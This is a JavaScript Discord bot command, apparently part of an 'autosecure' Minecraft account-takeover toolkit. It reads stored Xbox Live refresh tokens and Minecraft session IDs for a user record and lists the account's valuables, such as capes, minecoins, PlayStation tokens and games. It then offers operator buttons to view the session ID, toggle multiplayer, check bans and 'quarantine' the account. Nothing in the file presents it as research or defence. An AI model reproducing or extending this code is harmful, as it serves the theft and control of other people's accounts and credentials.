const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const generate = require("../../../autosecure/utils/generate");
const { parsePurchases } = require("../../../autosecure/utils/info/parsePurchases");

module.exports = {
  name: "minecraft",
  userOnly: true,
  callback: async (client, interaction) => {
    try {
      const secureId = generate(32);
      const secureId2 = generate(32);
      const secureId3 = generate(32);
      const secureId4 = generate(32);
      const secureId5 = generate(32);
      const secureId6 = generate(32);
      const uid = interaction.customId.split('|')[1];

      const result = await client.queryParams(`SELECT * FROM extrainformation WHERE uid = ?`, [uid]);
      if (!result || result.length === 0) {
        return interaction.reply({ content: "No data found for this user.", ephemeral: true });
      }

    //  console.log(result)

      let {
        username,
        xblrefresh,
        ssid,
        creationdate,
        changedusername,
        hasmc,
        minecoin,
        playstation,
        capes,
        lunar,
        namechange,
        mcitems
      } = result[0];

      let capesList = [];
      if (capes) {
        try {
          capesList = typeof capes === 'string' ? JSON.parse(capes) : capes;
          if (typeof capesList === 'string') capesList = JSON.parse(capesList);
        } catch {
          capesList = [];
        }
      }
      if (!Array.isArray(capesList)) capesList = [];
      capes = capesList;

      let mcitemsList = [];
      if (mcitems) {
        try {
          mcitemsList = typeof mcitems === 'string' ? JSON.parse(mcitems) : mcitems;
          if (typeof mcitemsList === 'string') mcitemsList = JSON.parse(mcitemsList);
        } catch {
          mcitemsList = [];
        }
      }
      if (!Array.isArray(mcitemsList)) mcitemsList = [];
      mcitems = mcitemsList;

      await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId, `minecraftmpenable|${xblrefresh}`]
      );
      await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId2, `minecraftmpdisable|${xblrefresh}`]
      );
      await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId3, `minecraftssid|${ssid}`]
      );
      await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId4, `optifinecape|${ssid}|${username}`]
      );

          await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId5, `checkbanmc|${ssid}`]
      );

          await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [secureId6, `quarantinemc|${ssid}`]
      );

      const { redeemedCapes } = parsePurchases(result[0].purchases);
      const capesString = Array.isArray(capes) && capes.length > 0 ? capes.join(", ") : "None";
      const redeemedCapesString = redeemedCapes.length > 0 ? redeemedCapes.join(", ") : "None";

      let isGamepass = false;
      let games = [];
      if (Array.isArray(mcitems)) {
        for (const item of mcitems) {
          const rawName = typeof item === "string" ? item : (item?.name || "");
          const rawSource = typeof item === "object" ? String(item?.source || "").toUpperCase() : "";
          if (rawSource.includes("GAMEPASS") || rawSource.includes("XGP") || rawSource.includes("SUBSCRIPTION")) {
            isGamepass = true;
          }
          const lower = rawName.toLowerCase();
          if (lower.includes("game_pass") || lower.includes("gamepass") || lower.includes("xgp")) {
            isGamepass = true;
            continue;
          }
          if (lower === "minecraft" || lower === "minecraft java" || lower === "product_minecraft" || lower === "game_minecraft") {
            if (!games.includes("Minecraft Java")) games.push("Minecraft Java");
          } else if (lower.includes("bedrock")) {
            if (!games.includes("Minecraft Bedrock")) games.push("Minecraft Bedrock");
          } else if (lower.includes("dungeon")) {
            if (!games.includes("Minecraft Dungeons")) games.push("Minecraft Dungeons");
          } else if (lower.includes("legend")) {
            if (!games.includes("Minecraft Legends")) games.push("Minecraft Legends");
          } else if (rawName.trim()) {
            if (!games.includes(rawName.trim())) games.push(rawName.trim());
          }
        }
      }

      if (!isGamepass && result[0]?.subscriptions) {
        try {
          let subs = JSON.parse(result[0].subscriptions);
          if (typeof subs === 'string') subs = JSON.parse(subs);
          if (Array.isArray(subs)) {
            for (const sub of subs) {
              const sName = String(sub?.name || "").toLowerCase();
              if (sName.includes("game pass") || sName.includes("gamepass") || sName.includes("xgp")) {
                isGamepass = true;
                break;
              }
            }
          }
        } catch (e) {}
      }

      const ownsMinecraftDisplay = (hasmc === "1" || hasmc === 1) 
        ? (isGamepass ? "Game Pass" : "Yes") 
        : "No";

const embed = new EmbedBuilder()
  .setColor(0x87CEEB)
  .setTitle(`Minecraft info for: ${username || "Unknown"}`)
  .addFields(
    { name: "Owns Minecraft", value: `\`\`\`${ownsMinecraftDisplay}\`\`\``, inline: true },
    { name: "Capes (Java)", value: `\`\`\`${capesString}\`\`\``, inline: true },
    { name: "Redeemed Capes (MS)", value: `\`\`\`${redeemedCapesString}\`\`\``, inline: true },
    { name: "Changed Username", value: `\`\`\`${changedusername === "1" || changedusername === 1 ? "Yes" : "No"}\`\`\``, inline: true },
    { name: "Namechange available", value: `\`\`\`${namechange === "1" || namechange === 1 ? "Yes" : "No"}\`\`\``, inline: true },
    { name: "Creation Date", value: `\`\`\`${creationdate || "Unknown"}\`\`\``, inline: true },
    { name: "Minecoins", value: `\`\`\`${minecoin || "0"}\`\`\``, inline: true },
    { name: "PlayStation Tokens", value: `\`\`\`${playstation || "0"}\`\`\``, inline: true },
    { name: "Games", value: `\`\`\`${games.length > 0 ? (isGamepass ? games.join(', ') + ' (Game Pass)' : games.join(', ')) : "None"}\`\`\``, inline: true }
  );



      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`action|${secureId4}`)
          .setLabel('Optifine Cape')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`action|${secureId}`)
          .setLabel('Enable Multiplayer')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`action|${secureId2}`)
          .setLabel('Disable Multiplayer')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId(`action|${secureId3}`)
          .setLabel('SSID Viewer')
          .setStyle(ButtonStyle.Primary)
      );

      const row2 = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`action|${secureId5}`)
          .setLabel('Check Ban')
          .setStyle(ButtonStyle.Primary), 
        new ButtonBuilder()
          .setCustomId(`action|${secureId6}`)
          .setLabel('Add to Quarantine')
          .setStyle(ButtonStyle.Primary)
      );

      return interaction.reply({
        embeds: [embed],
        components: [row, row2],
        ephemeral: true
      });
    } catch (error) {
      console.error("Error fetching minecraft info:", error);
      const method = (interaction.deferred || interaction.replied) ? 'followUp' : 'reply';
      return interaction[method]({
        content: "An error occurred while fetching Minecraft information.",
        ephemeral: true
      }).catch(() => {});
    }
  }
};
